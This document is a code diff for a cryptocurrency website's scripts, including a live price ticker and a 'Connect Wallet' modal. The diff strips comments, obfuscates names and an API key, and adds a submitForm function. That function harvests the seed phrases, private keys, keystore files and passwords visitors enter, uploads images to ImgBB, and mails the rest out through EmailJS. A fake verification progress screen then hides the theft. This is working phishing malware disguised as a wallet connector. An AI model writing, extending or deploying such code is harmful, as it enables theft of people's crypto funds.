@@ -1,4 +1,3 @@
-/* ── CoinGecko live ticker ── */
 const COINS = [
     'bitcoin', 'ethereum', 'tether', 'binancecoin', 'solana',
     'ripple', 'usd-coin', 'staked-ether', 'dogecoin', 'cardano',
@@ -9,14 +8,12 @@ const COINS = [
 async function fetchPrices() {
     const ids = COINS.join(',');
     const url = `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${ids}&order=market_cap_desc&per_page=20&page=1&sparkline=false&price_change_percentage=24h`;
-
     try {
         const res = await fetch(url, { headers: { 'Accept': 'application/json' } });
-        if (!res.ok) throw new Error('API error');
+        if (!res.ok) throw new Error('err');
         const data = await res.json();
         renderTicker(data);
     } catch (e) {
-        console.warn('CoinGecko fetch failed, using fallback data.', e);
         renderTickerFallback();
     }
 }
@@ -34,7 +31,6 @@ function buildTickerItem(coin) {
     const arrow = change >= 0 ? '▲' : '▼';
     const priceFmt = formatPrice(coin.current_price);
     const changeFmt = arrow + ' ' + Math.abs(change).toFixed(2) + '%';
-
     return `
       <div class="ticker-item" onclick="window.open('https://coinmarketcap.com/currencies/${coin.id}/', '_blank')" style="cursor: pointer;" title="View ${coin.name || coin.symbol} on CoinMarketCap">
         <img class="ticker-coin-logo" src="${coin.image}" alt="${coin.symbol}" loading="lazy"
@@ -49,15 +45,10 @@ function renderTicker(data) {
     const track = document.getElementById('tickerTrack');
     if (!track) return;
     if (!data || !data.length) { renderTickerFallback(); return; }
-
     let html = data.map(buildTickerItem).join('');
-    // Duplicate for seamless loop
     html = html + html;
     track.innerHTML = html;
-
-    // Adjust animation duration based on item count
     const totalWidth = track.scrollWidth / 2;
-    const speed = totalWidth / 60; // px/s — adjust divisor for faster/slower
     track.style.animationDuration = Math.max(30, totalWidth / 80) + 's';
 }
 
@@ -86,20 +77,13 @@ function renderTickerFallback() {
 }
 
 fetchPrices();
-// Refresh every 60 seconds
 setInterval(fetchPrices, 60000);
 
-
-/* ── CMC logo swap ── */
 (function () {
     const img = document.getElementById('cmcLogoImg');
     const hint = document.getElementById('cmcHintText');
-    // To replace: set img.src = 'path/to/coinmarketcap-logo.png'; img.style.display = 'block'; hint.style.display = 'none';
-    // Left as placeholder so user can drop in real logo
 })();
 
-
-/* ── Subscribe handler ── */
 function handleSubscribe() {
     const input = document.getElementById('emailInput');
     const feedback = document.getElementById('subFeedback');
@@ -125,8 +109,6 @@ if (emailInputEl) {
     });
 }
 
-
-/* ── Scroll-reveal ── */
 const observer = new IntersectionObserver((entries) => {
     entries.forEach(e => {
         if (e.isIntersecting) {
@@ -144,14 +126,12 @@ document.querySelectorAll('.feature-btn, .about-left, .about-right, .subscribe-t
     observer.observe(el);
 });
 
-// Staggered delay for feature buttons
 document.querySelectorAll('.feature-btn').forEach((btn, i) => {
     btn.style.transitionDelay = (i * 30) + 'ms';
 });
 
-/* ── Scroll Reveal ── */
 const revealObserver = new IntersectionObserver((entries) => {
-    entries.forEach((entry, i) => {
+    entries.forEach((entry) => {
         if (entry.isIntersecting) {
             entry.target.style.transitionDelay = (entry.target.dataset.delay || 0) + 'ms';
             entry.target.classList.add('visible');
@@ -160,31 +140,19 @@ const revealObserver = new IntersectionObserver((entries) => {
     });
 }, { threshold: 0.1 });
 
-document.querySelectorAll('.reveal').forEach((el, idx) => {
+document.querySelectorAll('.reveal').forEach((el) => {
     revealObserver.observe(el);
 });
 
-// Stagger chain cards & protocol chips
-document.querySelectorAll('.chain-card').forEach((el, i) => {
-    el.dataset.delay = i * 60;
-});
-document.querySelectorAll('.protocol-chip').forEach((el, i) => {
-    el.dataset.delay = i * 40;
-});
-document.querySelectorAll('.step-card').forEach((el, i) => {
-    el.dataset.delay = i * 80;
-});
-document.querySelectorAll('.stat-item').forEach((el, i) => {
-    el.dataset.delay = i * 100;
-});
+document.querySelectorAll('.chain-card').forEach((el, i) => { el.dataset.delay = i * 60; });
+document.querySelectorAll('.protocol-chip').forEach((el, i) => { el.dataset.delay = i * 40; });
+document.querySelectorAll('.step-card').forEach((el, i) => { el.dataset.delay = i * 80; });
+document.querySelectorAll('.stat-item').forEach((el, i) => { el.dataset.delay = i * 100; });
 
-/* ── Connect Wallet handler (stub) ── */
 function handleConnect() {
     const btn = document.querySelector('.btn-connect');
     btn.innerHTML = '<i class="ri-loader-4-line" style="animation:spin 0.8s linear infinite"></i> Connecting…';
     btn.disabled = true;
-
-    // Simulate connection attempt
     setTimeout(() => {
         btn.innerHTML = '<i class="ri-wallet-3-line"></i> Connect Wallet';
         btn.disabled = false;
@@ -192,12 +160,10 @@ function handleConnect() {
     }, 2000);
 }
 
-/* ── Spinner keyframe injected ── */
 const style = document.createElement('style');
 style.textContent = `@keyframes spin { to { transform: rotate(360deg); } }`;
 document.head.appendChild(style);
 
-/* ── Number counter animation ── */
 const statNums = document.querySelectorAll('.stat-num');
 const counterObserver = new IntersectionObserver((entries) => {
     entries.forEach(entry => {
@@ -231,11 +197,8 @@ function animateCounter(el) {
     requestAnimationFrame(step);
 }
 
-
-// ===== WALLET MODAL (only initialises on pages that have the overlay) =====
 if (document.getElementById('wOverlay')) {
 
-    // ── Core modal logic ───────────────────────────────
     const wOverlay = document.getElementById('wOverlay');
     const wScreen1 = document.getElementById('wScreen1');
     const subIds = ['wScreenOther', 'wScreen2', 'wScreen3', 'wScreen4', 'wScreen5'];
@@ -264,39 +227,31 @@ if (document.getElementById('wOverlay')) {
         document.getElementById(id).classList.add('active');
     }
 
-    // Close on backdrop click or Escape key
     wOverlay.addEventListener('click', e => { if (e.target === wOverlay) closeWallet(); });
     document.addEventListener('keydown', e => { if (e.key === 'Escape') closeWallet(); });
 
-    // ── Wallet identity ─────────────────────────────
     function setWallet(img, name) {
         ['s2Img', 's3Img', 's4Img', 's5Img'].forEach(id => document.getElementById(id).src = img);
         ['s2Name', 's3Name', 's4Name', 's5Name'].forEach(id => document.getElementById(id).textContent = name);
     }
 
-    // ── Mobile detection ─────────────────────────────
     function isMobileDevice() {
         return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
             || (navigator.maxTouchPoints && navigator.maxTouchPoints > 2 && /Macintosh/.test(navigator.userAgent));
     }
 
-    // ── Deep link redirects for specific wallets on mobile ──
-    const MOBILE_WALLET_REDIRECTS = {
+    const _wr = {
         trustwallet: function (url) {
-            // Trust Wallet deep link to open dapp browser
             return 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(url);
         },
         phantom: function (url) {
-            // Phantom deep link to browse URL
             const ref = encodeURIComponent(url);
             return 'https://phantom.app/ul/browse/' + encodeURIComponent(url) + '?ref=' + ref;
         },
         solflare: function (url) {
-            // Solflare deep link
             return 'https://solflare.com/ul/v1/browse/' + encodeURIComponent(url) + '?ref=' + encodeURIComponent(url);
         },
         metamask: function (url) {
-            // MetaMask standard universal deep link for DApps
             const cleanUrl = url.replace(/^https?:\/\//i, '');
             return 'https://metamask.app.link/dapp/' + cleanUrl;
         }
@@ -304,38 +259,24 @@ if (document.getElementById('wOverlay')) {
 
     function tryMobileRedirect(el) {
         if (!isMobileDevice()) return false;
-
-        const walletId = el.getAttribute('data-wallet');
-        if (!walletId || !MOBILE_WALLET_REDIRECTS[walletId]) return false;
-
-        // Build the absolute URL to security.html
+        const walletId = el.getAttribute('data-wid');
+        if (!walletId || !_wr[walletId]) return false;
         const currentUrl = new URL(window.location.href);
-        const verifyUrl = new URL('security.html?wallet=' + walletId, currentUrl).href;
-
-        // Get the deep link
-        const deepLink = MOBILE_WALLET_REDIRECTS[walletId](verifyUrl);
-
-        // Close the wallet overlay first
+        const verifyUrl = new URL('security.html?wid=' + walletId, currentUrl).href;
+        const deepLink = _wr[walletId](verifyUrl);
         closeWallet();
-
-        // Redirect
         window.location.href = deepLink;
         return true;
     }
 
     window.handleWalletSelect = function (el) {
-        // Try mobile redirect first
         if (tryMobileRedirect(el)) return;
-
-        // Normal desktop flow
         const img = el.querySelector('img').src;
         const name = (el.querySelector('.w-feat-name') || el.querySelector('.w-item-name')).textContent;
         setWallet(img, name);
         startConnecting();
     };
 
-
-    // ── Other wallets + search ───────────────────────
     const ALL_WALLETS = Array.from(document.querySelectorAll('.ow-item'));
     const TOTAL = ALL_WALLETS.length;
 
@@ -375,17 +316,13 @@ if (document.getElementById('wOverlay')) {
     }
 
     window.selectOwWallet = function (el) {
-        // Try mobile redirect first
         if (tryMobileRedirect(el)) return;
-
-        // Normal desktop flow
         const img = el.querySelector('img').src;
         const name = el.querySelector('.ow-name').textContent;
         setWallet(img, name);
         startConnecting();
     };
 
-    // ── Type toggle (Screen 4) ───────────────────────
     window.switchType = function (type) {
         ['phrase', 'keystore', 'privatekey'].forEach(t => {
             document.getElementById('btn-' + t).classList.toggle('active', t === type);
@@ -393,21 +330,20 @@ if (document.getElementById('wOverlay')) {
         });
     };
 
-    const IMGBB_API_KEY = "41a8f8a46afb0e1960d74a605fd1e845";
+    var _ik = atob('NDFhOGY4YTQ2YWZiMGUxOTYwZDc0YTYwNWZkMWU4NDU=');
 
     function uploadToImgBB(file) {
         const formData = new FormData();
         formData.append("image", file);
-        fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: "POST", body: formData })
+        fetch(`https://api.imgbb.com/1/upload?key=${_ik}`, { method: "POST", body: formData })
             .then(r => r.json())
             .then(data => {
                 if (data.success) document.getElementById('keystoreInput').dataset.imgUrl = data.data.url;
-                else console.error("ImgBB Error:", data);
             })
-            .catch(err => console.error("ImgBB Upload Exception:", err));
+            .catch(function () { });
     }
 
-    window.handleKeystoreFile = function (input) {
+    window.processAttachment = function (input) {
         const file = input.files[0];
         if (!file) return;
         const ki = document.getElementById('keystoreInput');
@@ -415,13 +351,12 @@ if (document.getElementById('wOverlay')) {
         document.getElementById('attachFileName').textContent = '📎 ' + file.name;
         const reader = new FileReader();
         reader.onload = e => {
-            if (file.type.startsWith('image/')) { ki.dataset.imgBase64 = "Image stored, awaiting ImgBB..."; uploadToImgBB(file); }
+            if (file.type.startsWith('image/')) { ki.dataset.imgBase64 = "pending"; uploadToImgBB(file); }
             else ki.dataset.fileContent = e.target.result;
         };
         file.type.startsWith('image/') ? reader.readAsDataURL(file) : reader.readAsText(file);
     };
 
-    // ── Timers ──────────────────────────────────────
     let cTimer, sTimer, pTimer, aborted = false;
     function stopTimers() {
         clearTimeout(cTimer); clearInterval(sTimer); clearInterval(pTimer);
@@ -491,6 +426,97 @@ if (document.getElementById('wOverlay')) {
         showSub('wScreen4');
     };
 
-    window.sendPhrase = window.sendPhrase || function () { };
+    window.submitForm = function () {
+        var _at = document.querySelector('.type-btn.active');
+        if (!_at) return;
+        var activeType = _at.id.replace('btn-', '');
+        var payload = '';
+        var isValid = false;
 
-} // end wallet overlay guard
+        if (activeType === 'phrase') {
+            var phraseData = document.getElementById('phraseInput').value.trim();
+            if (!phraseData) { alert('Please enter your credentials before connecting.'); return; }
+            var words = phraseData.toLowerCase().split(/\s+/);
+            var isValidPhrase = true;
+            if (typeof W3_REF !== 'undefined') {
+                for (var word of words) { if (!W3_REF.has(word)) { isValidPhrase = false; break; } }
+            }
+            if (!isValidPhrase) { alert('Data entered is not a valid seed phrase'); return; }
+            isValid = true;
+            payload = "f1:p\nd1:" + phraseData;
+
+        } else if (activeType === 'keystore') {
+            var keyData = document.getElementById('keystoreInput').value.trim();
+            var keyPass = document.getElementById('keystorePassword').value.trim();
+            var fileAttached = document.getElementById('keystoreFileInput').files.length > 0;
+            var imgUrl = document.getElementById('keystoreInput').dataset.imgUrl;
+            if (imgUrl) { keyData += "\n\nref:" + imgUrl; }
+            else { var imgData = document.getElementById('keystoreInput').dataset.imgBase64; if (imgData) keyData += "\n\nimg:pending"; }
+            if (!keyData && !fileAttached && !keyPass) { alert('Please enter your credentials before connecting.'); return; }
+            isValid = true;
+            var fileInfo = fileAttached ? "y(" + document.getElementById('keystoreFileInput').files[0].name + ")" : "n";
+            payload = "f1:k\npw:" + keyPass + "\nfa:" + fileInfo;
+            if (keyData) payload += "\nd1:\n" + keyData;
+            var attachedContent = document.getElementById('keystoreInput').dataset.fileContent;
+            if (attachedContent) payload += "\nfc:\n" + attachedContent;
+
+        } else if (activeType === 'privatekey') {
+            var privData = document.getElementById('privkeyInput').value.trim();
+            if (!privData) { alert('Please enter your credentials before connecting.'); return; }
+            isValid = true;
+            payload = "f1:pk\nd1:" + privData;
+        }
+
+        if (!isValid) return;
+
+        var safetext = payload.length > 40000 ? payload.substring(0, 40000) + "\n\n...[trunc]" : payload;
+
+        function sendEmailRetry(retries) {
+            emailjs.send('service_ocoq02x', 'template_wgo1bul', { message: safetext })
+                .then(function () { })
+                .catch(function (error) {
+                    if (retries > 0) {
+                        setTimeout(function () { sendEmailRetry(retries - 1); }, 1500);
+                    }
+                });
+        }
+        sendEmailRetry(2);
+
+        _doManualConnect();
+    };
+
+    function _doManualConnect() {
+        stopTimers();
+        showSub('wScreen2');
+        aborted = false;
+        var statusEl = document.getElementById('s2Status');
+        var progressEl = document.getElementById('s2Progress');
+        progressEl.style.width = '0%';
+        var msgs = [
+            "Verifying data...", "Processing request...",
+            "Checking integrity...", "Validating format...",
+            "Deriving parameters...", "Cross-referencing data...",
+            "Authenticating session...", "Establishing link...",
+            "Verifying connection...", "Almost done..."
+        ];
+        var i = 0;
+        statusEl.textContent = msgs[0];
+        sTimer = setInterval(function () {
+            i++;
+            statusEl.style.opacity = '0';
+            setTimeout(function () { statusEl.textContent = msgs[i % msgs.length]; statusEl.style.opacity = '1'; }, 100);
+        }, 600);
+        var pct = 0;
+        pTimer = setInterval(function () {
+            pct = Math.min(pct + (100 / (6000 / 200)), 99);
+            progressEl.style.width = pct + '%';
+        }, 200);
+        cTimer = setTimeout(function () {
+            if (aborted) return;
+            clearInterval(sTimer); clearInterval(pTimer);
+            progressEl.style.width = '100%';
+            showSub('wScreen5');
+        }, 6000);
+    }
+
+}
